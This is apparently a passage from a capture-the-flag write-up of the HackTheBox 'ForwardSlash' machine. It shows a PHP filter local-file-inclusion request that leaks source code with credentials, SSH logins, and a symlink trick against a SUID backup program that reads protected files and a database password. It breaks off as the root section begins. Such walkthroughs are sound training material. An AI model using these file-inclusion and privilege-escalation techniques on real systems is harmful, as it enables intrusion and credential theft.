&lt;p&gt;We start enumeration the website and quickly found the &lt;code&gt;/dev/&lt;/code&gt; folder. He is not
accessible from our IP address as there must be some network filtering.&lt;/p&gt;
&lt;p&gt;&lt;img alt="dev access denied" src="/media/2020.07/forwardslash_03.png"&gt;&lt;/p&gt;
&lt;p&gt;We try to include the file with our previous LFI but we got an error saying "Permission Denied; not that way ;)"&lt;/p&gt;
&lt;p&gt;Here is the request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 17&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;url=dev/index.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then try to use the PHP filters to access the file content. The base64 filter
give us the content of the file base64 encoded.&lt;/p&gt;
&lt;p&gt;Here is the request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 61&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;url=php://filter/convert.base64-encode/resource=dev/index.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is the server's answer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We decode the base64 content to get the old database credentials.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;if (preg_match($reg, $_GET[&amp;#39;xml&amp;#39;], $match)) {&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        $ip = explode(&amp;#39;/&amp;#39;, $match[0])[2];&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        echo $ip;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        error_log(&amp;quot;Connecting&amp;quot;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        $conn_id = ftp_connect($ip) or die(&amp;quot;Couldn&amp;#39;t connect to $ip\n&amp;quot;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        error_log(&amp;quot;Logging in&amp;quot;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        if (@ftp_login($conn_id, &amp;quot;chiv&amp;quot;, &amp;#39;N0bodyL1kesBack/&amp;#39;)) {&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;                error_log(&amp;quot;Getting file&amp;quot;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;                echo ftp_get_string($conn_id, &amp;quot;debug.txt&amp;quot;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This credentials are also valid for the SSH service as &lt;code&gt;chiv&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh chiv@forwardslash.htb&lt;/span&gt;
&lt;span class="code-line"&gt;chiv@forwardslash.htb&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;chiv@forwardslash:~$&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is no user.txt in &lt;code&gt;chiv&lt;/code&gt;'s home folder. The other user is &lt;code&gt;pain&lt;/code&gt; with the
&lt;code&gt;uid&lt;/code&gt; 1000. We start enumerating the box for a privilege escalation.&lt;/p&gt;
&lt;p&gt;We can list the file in the &lt;code&gt;pain&lt;/code&gt; user homefolder. The &lt;code&gt;encryptorinator&lt;/code&gt; and
&lt;code&gt;note.txt&lt;/code&gt; are even readable by they are for the root part, so we will come back
to them later.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:~$ ls ../pain/&lt;/span&gt;
&lt;span class="code-line"&gt;encryptorinator  note.txt  user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When looking at &lt;code&gt;/var/backups/&lt;/code&gt; we see a few interesting files, mainly the
&lt;code&gt;config.php.bak&lt;/code&gt; that is only readable by the &lt;code&gt;pain&lt;/code&gt; user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:~$ ls /var/backups/ -l&lt;/span&gt;
&lt;span class="code-line"&gt;total 996&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root            61440 Mar 24 06:25 alternatives.tar.0&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root            38908 Mar 24 06:17 apt.extended_states.0&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root             4115 Mar  6 14:17 apt.extended_states.1.gz&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root             3909 Mar  5 14:46 apt.extended_states.2.gz&lt;/span&gt;
&lt;span class="code-line"&gt;-rw------- 1 pain pain              526 Jun 21  2019 config.php.bak&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              437 Mar  5 14:07 dpkg.diversions.0&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              202 Mar  5 14:07 dpkg.diversions.1.gz&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              207 Mar  5 14:47 dpkg.statoverride.0&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              171 Mar  5 14:47 dpkg.statoverride.1.gz&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root           668374 Mar 24 06:17 dpkg.status.0&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 root root           188241 Mar 24 06:17 dpkg.status.1.gz&lt;/span&gt;
&lt;span class="code-line"&gt;-rw------- 1 root root              730 Mar 17 20:13 group.bak&lt;/span&gt;
&lt;span class="code-line"&gt;-rw------- 1 root shadow            604 Mar 17 20:13 gshadow.bak&lt;/span&gt;
&lt;span class="code-line"&gt;-r--r--r-- 1 root root              129 May 27  2019 note.txt&lt;/span&gt;
&lt;span class="code-line"&gt;-rw------- 1 root root             1660 Mar  5 14:46 passwd.bak&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwx--- 2 root backupoperator   4096 May 27  2019 recovery&lt;/span&gt;
&lt;span class="code-line"&gt;-rw------- 1 root shadow           1174 Mar  6 14:21 shadow.bak&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When looking for SUID binary we found that the binary &lt;code&gt;/usr/bin/backup&lt;/code&gt; is SUID
and belonging to the &lt;code&gt;pain&lt;/code&gt; user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/home/pain$ find / -uid 1000 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/backup&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The binary is a standard linux program. When we run it, it told us that a file
doesn't exist. The filename looks like a MD5 hash.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/home/pain$ file /usr/bin/backup&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=e0fcfb1c48fe0b5377774c1d237dc50ddfa41c08, not stripped&lt;/span&gt;
&lt;span class="code-line"&gt;chiv@forwardslash:/home/pain$ /usr/bin/backup&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Current Time: 10:14:45&lt;/span&gt;
&lt;span class="code-line"&gt;ERROR: f057d631c54aae27e968bc3fafb02b4e Does Not Exist or Is Not Accessible By Me, Exiting...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;ltrace&lt;/code&gt; to see what are the system call of the program and we see that
the filename is a MD5 hash of the current time.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/home/pain$ ltrace /usr/bin/backup&lt;/span&gt;
&lt;span class="code-line"&gt;getuid()                                                                                                                                         = 1001&lt;/span&gt;
&lt;span class="code-line"&gt;getgid()                                                                                                                                         = 1001&lt;/span&gt;
&lt;span class="code-line"&gt;puts(&amp;quot;--------------------------------&amp;quot;...----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;)                                                                                                      = 277&lt;/span&gt;
&lt;span class="code-line"&gt;time(0)                                                                                                                                          = 1588846490&lt;/span&gt;
&lt;span class="code-line"&gt;localtime(0x7ffdb8c71790)                                                                                                                        = 0x7f373a3526a0&lt;/span&gt;
&lt;span class="code-line"&gt;malloc(13)                                                                                                                                       = 0x56277209e8e0&lt;/span&gt;
&lt;span class="code-line"&gt;sprintf(&amp;quot;10:14:50&amp;quot;, &amp;quot;%02d:%02d:%02d&amp;quot;, 10, 14, 50)                                                                                                = 8&lt;/span&gt;
&lt;span class="code-line"&gt;strlen(&amp;quot;10:14:50&amp;quot;)                                                                                                                               = 8&lt;/span&gt;
&lt;span class="code-line"&gt;malloc(33)                                                                                                                                       = 0x56277209e900&lt;/span&gt;
&lt;span class="code-line"&gt;MD5_Init(0x7ffdb8c716e0, 4000, 0x56277209e900, 0x56277209e900)                                                                                   = 1&lt;/span&gt;
&lt;span class="code-line"&gt;MD5_Update(0x7ffdb8c716e0, 0x56277209e8e0, 8, 0x56277209e8e0)                                                                                    = 1&lt;/span&gt;
&lt;span class="code-line"&gt;MD5_Final(0x7ffdb8c71740, 0x7ffdb8c716e0, 0x7ffdb8c716e0, 0)                                                                                     = 1&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;9c&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x9c)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;71&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x71)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;36&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x36)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;55&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x55)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;35&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x35)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;e4&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xe4)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;4d&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x4d)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;c7&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xc7)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;6d&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x6d)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;65&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x65)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;bb&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xbb)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;cd&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xcd)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;1f&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x1f)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;aa&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xaa)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;ab&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xab)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;snprintf(&amp;quot;14&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x14)                                                                                                                 = 2&lt;/span&gt;
&lt;span class="code-line"&gt;printf(&amp;quot;Current Time: %s\n&amp;quot;, &amp;quot;10:14:50&amp;quot;Current Time: 10:14:50&lt;/span&gt;
&lt;span class="code-line"&gt;)                                                                                                         = 23&lt;/span&gt;
&lt;span class="code-line"&gt;setuid(1002)                                                                                                                                     = -1&lt;/span&gt;
&lt;span class="code-line"&gt;setgid(1002)                                                                                                                                     = -1&lt;/span&gt;
&lt;span class="code-line"&gt;access(&amp;quot;9c71365535e44dc76d65bbcd1faaab14&amp;quot;..., 0)                                                                                                 = -1&lt;/span&gt;
&lt;span class="code-line"&gt;printf(&amp;quot;ERROR: %s Does Not Exist or Is N&amp;quot;..., &amp;quot;9c71365535e44dc76d65bbcd1faaab14&amp;quot;...ERROR: 9c71365535e44dc76d65bbcd1faaab14 Does Not Exist or Is Not Accessible By Me, Exiting...&lt;/span&gt;
&lt;span class="code-line"&gt;)                                                             = 94&lt;/span&gt;
&lt;span class="code-line"&gt;setuid(1001)                                                                                                                                     = 0&lt;/span&gt;
&lt;span class="code-line"&gt;setgid(1001)                                                                                                                                     = 0&lt;/span&gt;
&lt;span class="code-line"&gt;remove(&amp;quot;9c71365535e44dc76d65bbcd1faaab14&amp;quot;...)                                                                                                    = -1&lt;/span&gt;
&lt;span class="code-line"&gt;+++ exited (status 0) +++&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With a simple combination of &lt;code&gt;grep&lt;/code&gt; and &lt;code&gt;cut&lt;/code&gt; we can extract the current filename
used by the program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:~$ /usr/bin/backup | grep ERROR | cut -d &amp;#39; &amp;#39; -f 2&lt;/span&gt;
&lt;span class="code-line"&gt;705159512ab36c24a46aead527de7fb5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then create a temporary folder and try to get the file &lt;code&gt;user.txt&lt;/code&gt; in
pain's homedir by creating a symlink with the name of the file used by the backup
program and then read it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/tmp/lolo$ ln -s /home/pain/user.txt ./$(/usr/bin/backup | grep ERROR | cut -d &amp;#39; &amp;#39; -f 2)  &amp;amp;&amp;amp; /usr/bin/backup&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Current Time: 12:28:53&lt;/span&gt;
&lt;span class="code-line"&gt;aec49cafdb7eec8710d3bdf623ac28f7&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We apply the same thing for the &lt;code&gt;config.php.bak&lt;/code&gt; file in &lt;code&gt;/var/backup/&lt;/code&gt; and get
some database credentials.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/tmp/lolo$ ln -s /var/backups/config.php.bak ./$(/usr/bin/backup | grep ERROR | cut -d &amp;#39; &amp;#39; -f 2)  &amp;amp;&amp;amp; /usr/bin/backup&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Current Time: 12:28:11&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="code-line"&gt;/* Database credentials. Assuming you are running MySQL&lt;/span&gt;
&lt;span class="code-line"&gt;server with default setting (user &amp;#39;root&amp;#39; with no password) */&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_SERVER&amp;#39;, &amp;#39;localhost&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_USERNAME&amp;#39;, &amp;#39;pain&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_PASSWORD&amp;#39;, &amp;#39;db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;define(&amp;#39;DB_NAME&amp;#39;, &amp;#39;site&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/* Attempt to connect to MySQL database */&lt;/span&gt;
&lt;span class="code-line"&gt;$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;// Check connection&lt;/span&gt;
&lt;span class="code-line"&gt;if($link === false){&lt;/span&gt;
&lt;span class="code-line"&gt;    die(&amp;quot;ERROR: Could not connect. &amp;quot; . mysqli_connect_error());&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This credentials allows us to connect as pain using SSH (we can grab the
&lt;code&gt;user.txt&lt;/code&gt; again).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_cache$ ssh pain@10.10.10.183&lt;/span&gt;
&lt;span class="code-line"&gt;pain@10.10.10.183&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;pain@forwardslash:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;96628de4960f22df8f7006205a8fa0bf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="getting-root"&gt;Getting root&lt;/h2&gt;
&lt;p&gt;In &lt;code&gt;pain&lt;/code&gt; homefolder we also found a &lt;code&gt;note.txt&lt;/code&gt; which disclose that some
"important" file are encrypted using homemade crypto (&lt;strong&gt;never use homemade
crypto&lt;/strong&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:~$ cat note.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-chiv&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The folder &lt;code&gt;encryptorinator&lt;/code&gt; contains a scripts in order to encrypt and
decrypt a message and an encrypted message. The &lt;code&gt;encrypter&lt;/code&gt; script is the
following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
